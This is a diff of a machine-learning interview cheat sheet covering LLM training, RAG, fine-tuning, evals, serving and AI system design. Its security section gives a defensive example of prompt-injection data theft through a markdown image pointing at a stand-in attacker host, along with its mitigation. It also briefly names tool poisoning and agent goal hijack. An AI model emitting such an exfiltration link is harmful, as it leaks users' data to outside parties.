@@ -11,7 +11,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - Bias-variance: high bias underfits (add capacity, features), high variance overfits (weight decay, dropout, more data, simpler model).
 - Cross-entropy is the right classification loss because it's the maximum-likelihood objective for a categorical distribution, and its gradient with respect to the logits (through softmax) is `p - y`, clean and well-scaled.
 - AdamW, not Adam: decouples weight decay from the adaptive gradient update, so decay is not rescaled per parameter. Pair it with warmup and a cosine or warmup-stable-decay schedule.
-- LayerNorm normalizes across the feature dimension per token, so it works with variable sequence lengths and small batches, unlike BatchNorm. Modern LLMs use pre-norm RMSNorm (no mean-centring, no bias): cheaper, equally stable.
+- LayerNorm normalises across the feature dimension per token, so it works with variable sequence lengths and small batches, unlike BatchNorm. Modern LLMs use pre-norm RMSNorm (no mean-centring, no bias): cheaper, equally stable.
 - Precision/recall trade off; accuracy lies on imbalanced data. ROC-AUC can look fine while PR-AUC exposes a weak positive class.
 - Cosine similarity, not Euclidean distance, is standard for embeddings, since it ignores magnitude and compares direction. On unit-normalised vectors cosine, dot product and L2 distance give the same ranking, so most stores normalise once and use dot product.
 - Data leakage is the silent killer of eval numbers: check for it before trusting any surprising result.
@@ -26,7 +26,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - Tokenization (BPE) explains the classic failures: character counting, arithmetic, multilingual token inefficiency.
 - Chinchilla: compute-optimal training scales parameters and tokens equally with compute (each roughly `∝ √C`), about 20 tokens per parameter, with training FLOPs `C ≈ 6ND`. Production models train far past that point because inference cost, not training cost, dominates total cost of ownership.
 - MoE: total params vs. active params per token. A large total parameter count with a small active count buys capacity at the per-token compute of a much smaller model, at the cost of routing and load-balancing complexity and a memory footprint sized by total params.
-- Hybrid SSM models (Jamba, Nemotron-H, Qwen3-Next, Kimi Linear) keep a small fraction of full-attention layers for exact recall and make the rest Mamba or linear attention with a fixed-size state. Memory grows with context only in the attention layers. Pure SSMs lose on exact recall and copying because a fixed state cannot losslessly hold an arbitrary prefix.
+- Hybrid SSM models (Jamba, Nemotron-H, Qwen3-Next, Kimi Linear) keep a minority of full-attention layers (a quarter or fewer) for exact recall and make the rest Mamba or linear attention with a fixed-size state. Memory grows with context only in the attention layers. Pure SSMs lose on exact recall and copying because a fixed state cannot losslessly hold an arbitrary prefix.
 - Reasoning models spend extra test-time compute (longer chains of thought, RL-trained) for higher accuracy on hard problems, at higher latency and cost. Use them selectively and cap the spend with the provider's effort or thinking-budget setting.
 → Deep dive: [02-llm-fundamentals](02-llm-fundamentals/)
 
@@ -34,7 +34,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 
 - Chain-of-thought helps on multi-step reasoning; it's wasted latency on simple lookups, and reasoning models already do it internally.
 - Structured output via constrained decoding: the schema is compiled to a grammar (FSM for regex-like constraints, pushdown automaton for nesting), and at every step tokens that cannot continue a valid parse get their logits set to `-inf`. Output parses by construction. It guarantees syntax, not semantics, so keep value validation, and a tight schema can hurt reasoning: put a free-text reasoning field before the answer fields. JSON mode only promises valid JSON, not your schema.
-- Prompt caching rewards a stable prefix: put fixed instructions and tool definitions first, volatile content (user input, retrieved docs) last. Matching is exact-prefix, so one changed token near the top (a timestamp, a reordered tool list) invalidates everything after it. Cache reads are typically 50-90% cheaper than fresh input.
+- Prompt caching rewards a stable prefix: put fixed instructions and tool definitions first, volatile content (user input, retrieved docs) last. Matching is exact-prefix, so one changed token near the top (a timestamp, a reordered tool list) invalidates everything after it. Cache reads are typically 50-90% cheaper than fresh input, but some providers charge a premium on cache writes and caches expire after minutes by default, so a prefix that is rarely reused may never pay back.
 - "Lost in the middle": put critical instructions at both the start and the end of a long context, not buried in the middle.
 - Context engineering is the 2025+ reframing of prompting: you're managing the whole window, tools, retrieved docs, memory, history, not just a string.
 - Context rot: quality degrades as the window fills, well before the advertised limit. Long-running agents need compaction (summarise old turns, clear stale tool results, keep notes outside the window) rather than a bigger window.
@@ -47,6 +47,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - Rerank with a cross-encoder after a wide initial retrieval, a typical pattern is retrieve top-50, rerank down to top-5.
 - Metadata filtering has to happen inside the ANN search (pre-filter or filter-aware traversal), not after it: a post-filter on top-k results can filter away everything relevant, and very selective filters may need a brute-force fallback.
 - Contextual retrieval (prepending a short LLM-written description of where the chunk sits in its document before embedding and BM25 indexing) meaningfully improves retrieval on chunked documents.
+- Shrink the index before buying hardware: Matryoshka embeddings truncate to a shorter prefix of dimensions, and int8 (4×) or binary (32×) quantization with a full-precision rescoring pass cuts vector memory at a small recall cost.
 - For PDFs heavy with tables, charts and scans, visual retrievers (ColPali-style late interaction over page images) can skip the parsing pipeline entirely, at a higher storage and query cost.
 - When debugging a bad RAG answer, triage first: is this a retrieval miss (wrong chunks returned) or a generation miss (right chunks, model didn't use them)? The fix is different for each.
 - Authorisation must be enforced at the retrieval layer with metadata filters, never left to the model to "decide" what a user shouldn't see.
@@ -56,7 +57,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 
 - Escalation path: prompting → RAG → fine-tuning. Don't fine-tune to inject facts, that's RAG's job; fine-tune for consistent style, structured output, or latency/cost wins.
 - LoRA: `W' = W + (α/r)BA`, with `B` initialised to zero so training starts exactly at the base model. Rank `r` typically 8-64, `r(d_in + d_out)` params per adapted matrix, roughly 0.1-1% of the base model. Merge `BA` into `W` for zero serving overhead, or keep adapters separate to serve many fine-tunes on one base.
-- QLoRA: 4-bit NF4 base quantization + double quantization + paged optimizers, fine-tunes a 65-70B model on a single 48 GB GPU with modest quality loss.
+- QLoRA: 4-bit NF4 base quantization + double quantization + paged optimizers. The paper fine-tuned a 65B model on a single 48 GB GPU while roughly matching 16-bit fine-tuning quality on its benchmarks. Gradients flow through the frozen 4-bit base into bf16 adapters.
 - Full fine-tuning with Adam in mixed precision costs roughly 16 bytes/param (2 bf16 weights + 2 grads + 4 fp32 master weights + 8 fp32 Adam states), a 7B model needs roughly 112 GB before activations.
 - DPO's insight: skip the separate reward model and the RL loop, optimise directly on preference pairs using an implicit reward derived from the policy itself.
 - GRPO drops PPO's value model: sample a group of responses per prompt and use each response's reward normalised against the group's mean (and standard deviation) as its advantage. It and other RL-for-reasoning methods work well on math and code specifically because those domains have cheap, verifiable rewards (does the test pass, is the answer correct). Watch for reward hacking against the verifier.
@@ -79,7 +80,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 ## 🧪 Evals & Observability
 
 - Evals are the engineering artifact that makes iteration safe. Treat eval-set changes with the same rigour as code changes: version them, run them in CI, gate deploys on them.
-- LLM-as-judge: pairwise comparison is more reliable than pointwise scoring. Known biases: position bias (swap order and average), verbosity bias, self-preference (use a different model family as judge when possible).
+- LLM-as-judge: pairwise comparison is usually more reliable than pointwise scoring for A/B decisions. For absolute monitoring, prefer binary pass/fail per criterion over 1-10 scales, and calibrate the judge against human labels before trusting it. Known biases: position bias (swap order and average), verbosity bias, self-preference (use a different model family as judge when possible).
 - pass@k unbiased estimator (Chen et al., Codex paper): generate `n ≥ k` samples, count `c` correct, `pass@k = 1 - C(n-c, k) / C(n, k)`. Naively sampling exactly k is high-variance.
 - pass^k (all k trials succeed, popularised by τ-bench, estimated as `C(c, k) / C(n, k)`) punishes inconsistency that pass@k hides, closer to what matters for agent reliability.
 - Small evals are noisy: standard error is `√(p(1-p)/n)`, so at 75% on 100 examples one SE is ~4.3 points and 78% vs 74% is not a result. Use paired comparisons on the same items, bootstrap confidence intervals, and repeated runs for stochastic agents.
@@ -96,10 +97,11 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - PagedAttention (vLLM) manages the KV cache like virtual memory in fixed-size blocks, cutting fragmentation waste to the last partial block per sequence, enabling much higher batch sizes and block-level prefix sharing.
 - Continuous batching lets requests join and leave a batch per decode step instead of waiting for the whole batch to finish, the single biggest throughput win in modern serving. Chunked prefill splits long prompts so they don't stall everyone else's decode.
 - Prefill/decode disaggregation runs the two phases on separate GPU pools and ships the KV cache between them, so each pool can be sized, batched and parallelised for its own bottleneck. Worth it at scale, overhead at small scale.
-- Speculative decoding: a cheap drafter (small model, EAGLE-style heads, built-in MTP modules, or n-gram lookup from the prompt) proposes γ tokens, the target verifies them in one pass. Accept each with probability `min(1, p_target/p_draft)` and resample from the residual on rejection, so the output distribution is exactly the target's. Expected tokens per target pass `(1 - α^(γ+1)) / (1 - α)` for acceptance rate α. Big wins at low batch on predictable text (code, extraction), shrinking or negative at high batch where verification steals compute.
+- Speculative decoding: a cheap drafter (small model, EAGLE-style heads, built-in MTP modules, or n-gram lookup from the prompt) proposes γ tokens, the target verifies them in one pass. Accept each with probability `min(1, p_target/p_draft)` and resample from the residual on rejection, so the output distribution is exactly the target's. Expected tokens per target pass `(1 - α^(γ+1)) / (1 - α)` for acceptance rate α (assuming independent acceptances). Wall-clock speedup divides that by `(γc + 1)`, where c is the drafter's cost per token relative to the target, so a slow drafter erases the gain. Big wins at low batch on predictable text (code, extraction), shrinking or negative at high batch where verification steals compute.
 - Semantic caching returns a stored answer when a new query embeds close to an old one. Unlike prefix caching (exact match, reuses computation, lossless) it skips the model entirely and is lossy: tune the threshold on real traffic, scope entries per tenant and per permission set, and never cache personalised or time-sensitive answers.
-- Hybrid SSM serving: attention layers keep per-token KV blocks while Mamba or linear layers hold a fixed-size state updated in place, so engines need a heterogeneous cache allocator. That state cannot be sliced or rolled back like KV blocks, so prefix caching, branching and disaggregation all get harder.
+- Hybrid SSM serving: attention layers keep per-token KV blocks while Mamba or linear layers hold a fixed-size state updated in place, so engines need a heterogeneous cache allocator. That state cannot be sliced or rolled back like KV blocks, so prefix caching, branching, speculative decoding and disaggregation all get harder. Engines work around it by snapshotting state at chunk boundaries, which costs extra memory.
 - MoE serving: memory is sized by total params, per-token compute by active params. At scale you shard experts across GPUs (expert parallelism) and pay for all-to-all routing traffic and load imbalance.
+- KV cache quantization (FP8 KV) halves cache memory versus BF16, roughly doubling the concurrent sequences or context that fit, usually at negligible quality cost. FP4 weights (NVFP4, MXFP4) on Blackwell-class GPUs halve weight memory again versus FP8, but validate quality per model.
 - Report goodput (throughput within your latency SLO), not raw throughput. 10K tokens/sec at 30-second TTFT is worthless for a chat product.
 - Prompt caching and batch APIs (typically 50% off, results within 24 hours) are the two biggest cost levers available with zero quality tradeoff, use them before reaching for a smaller model.
 → Deep dive: [08-inference-and-production](08-inference-and-production/)
@@ -112,6 +114,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - Assume the system prompt leaks. Never put secrets or unenforced authorisation logic in it.
 - Rendered markdown is an exfiltration channel: an injected `![](https://attacker/?q=secret)` leaks data the moment the client fetches the image. Allowlist image and link domains or strip URLs from output.
 - Safetensors over pickle for model weights, pickle deserialization can execute arbitrary code on load. Third-party MCP servers and skills are supply-chain dependencies too: pin versions, review diffs, sandbox bundled scripts, and watch for poisoned tool descriptions and rug pulls.
+- EU AI Act: prohibitions applied from February 2025 and general-purpose model obligations from August 2025. The Digital Omnibus deal (May 2026) moves stand-alone high-risk obligations (Annex III: hiring, credit scoring, education) to 2 December 2027 and product-embedded ones (Annex I) to 2 August 2028. Check the text as published in the Official Journal before quoting dates.
 - OWASP Top 10 for LLM Applications (2025 edition) is the shared vocabulary interviewers expect: prioritise the categories that matter for the system in front of you, don't just recite the list. For agents, the chain is LLM01 injection → LLM05 improper output handling → LLM06 excessive agency, and OWASP's separate Top 10 for Agentic Applications (December 2025) covers goal hijack, tool misuse, memory poisoning and inter-agent trust.
 → Deep dive: [09-safety-security-and-responsible-ai](09-safety-security-and-responsible-ai/)
 
@@ -120,7 +123,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - Vision-language models tokenize images into patches via a vision encoder (ViT-style), project them into the LLM's embedding space, then process them as ordinary tokens, more tokens per image, more cost.
 - CLIP's contrastive image-text pretraining is why zero-shot classification and cross-modal retrieval work at all: it aligns image and text embeddings in a shared space.
 - Diffusion models generate by iterative denoising; latent diffusion does this in a VAE-compressed latent space rather than pixel space, which is why it's tractable. Current image and video models (SD3, Flux class) use a transformer denoiser (DiT) trained with flow matching / rectified flow, giving straighter trajectories and fewer sampling steps. The VAE caps fine detail such as small text and faces.
-- VLMs are weak at precise counting, fine spatial reasoning, and dense OCR relative to dedicated pipelines, know when to reach for traditional OCR instead.
+- General VLMs still slip on precise counting, fine spatial reasoning, and exact transcription of dense tables and long digit strings (they hallucinate plausible characters). When you need exact text and bounding boxes, use a dedicated OCR or document-parsing model, classic or a small OCR-specialised VLM, and keep the general model for reasoning over its output.
 - Native speech-to-speech models beat the STT→LLM→TTS pipeline on latency and naturalness, but the pipeline is easier to control, debug, and swap components in.
 → Deep dive: [10-multimodal](10-multimodal/)
 
@@ -129,6 +132,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 - The model is a component, not the whole system. Spend your time on data/context strategy, evaluation, and failure modes, not on redesigning the transformer.
 - Always state success metrics and a rough cost-per-request estimate out loud, interviewers grade for cost and eval awareness as much as architecture.
 - Have a fallback and a degradation path for every external model call: retries, timeouts, a cheaper model, or a static response, never a bare unhandled failure.
+- Put an LLM gateway in front of every provider and self-hosted model: one place for auth, per-tenant quotas and cost attribution, routing and fallbacks, caching, redaction and logging. Trace each request as spans (model call, retrieval, tool call) with model version, tokens, cost and latency, using the OpenTelemetry GenAI semantic conventions so traces stay portable.
 - Do the capacity maths out loud: requests/sec × (input + output tokens) gives prefill and decode load, which gives GPUs or dollars per day. Then name the levers: model cascade or routing, prompt caching, batch for anything offline.
 → Deep dive: [11-ai-system-design](11-ai-system-design/)
 
@@ -148,7 +152,7 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 | KV cache size per token | `2 × n_layers × n_kv_heads × head_dim × bytes_per_elem` |
 | KV cache worked example | Llama-3-70B shape (80 layers, 8 KV heads, head_dim 128, BF16): ≈ 320 KB/token, ≈ 40 GB for one 128K-token sequence |
 | GQA saving | KV cache shrinks by `n_heads / n_kv_heads` vs MHA (64 query heads, 8 KV heads = 8×) |
-| Weight memory (inference) | params × bytes: BF16 2, FP8/INT8 1, INT4 ~0.5-0.6 with scales. 70B in BF16 ≈ 140 GB, before KV cache |
+| Weight memory (inference) | params × bytes: BF16 2, FP8/INT8 1, FP4/INT4 ~0.5-0.6 with scales. 70B in BF16 ≈ 140 GB, before KV cache |
 | Training compute | `C ≈ 6ND` FLOPs (N params, D tokens). Chinchilla-optimal ≈ 20 tokens per param |
 | LoRA update | `W' = W + (α/r)BA`, typical rank `r` = 8-64, `r(d_in + d_out)` params per adapted matrix |
 | Full fine-tuning memory (Adam, mixed precision) | ≈ 16 bytes/param (2 weights + 2 grads + 4 fp32 master + 8 Adam states), so 7B ≈ 112 GB before activations |
@@ -159,8 +163,8 @@ If a term below is unfamiliar, look it up in the [glossary](GLOSSARY.md) instead
 | TTFT | Time to first token: queueing + prefill |
 | TPOT / ITL | Time per output token after the first: memory-bandwidth-bound |
 | Total latency | `TTFT + TPOT × (output_tokens - 1)` |
-| Decode ceiling at batch 1 | tokens/sec ≤ HBM bandwidth / bytes read per step. 8B BF16 (16 GB) on a 3.35 TB/s H100 ≈ 200 tok/s at best |
-| Speculative decoding | Expected tokens per target pass `(1 - α^(γ+1)) / (1 - α)`. α = 0.8, γ = 4 gives ≈ 3.4 |
+| Decode ceiling at batch 1 | tokens/sec ≤ HBM bandwidth / bytes read per step. 8B BF16 (16 GB) on a 3.35 TB/s H100 ≈ 200 tok/s at best, ~500 on an ~8 TB/s B200 |
+| Speculative decoding | Expected tokens per target pass `(1 - α^(γ+1)) / (1 - α)`. α = 0.8, γ = 4 gives ≈ 3.4. Speedup ≈ that / `(γc + 1)`, c = draft cost relative to target |
 | Rerank pattern | Retrieve top-50 (cheap, wide) → rerank to top-5 (expensive, precise) |
 | Agent reliability | `p^n` compounding: 0.95 per step over 20 steps ≈ 0.36 end to end |
 | Cost levers | Cached input typically 50-90% off, batch APIs typically 50% off |
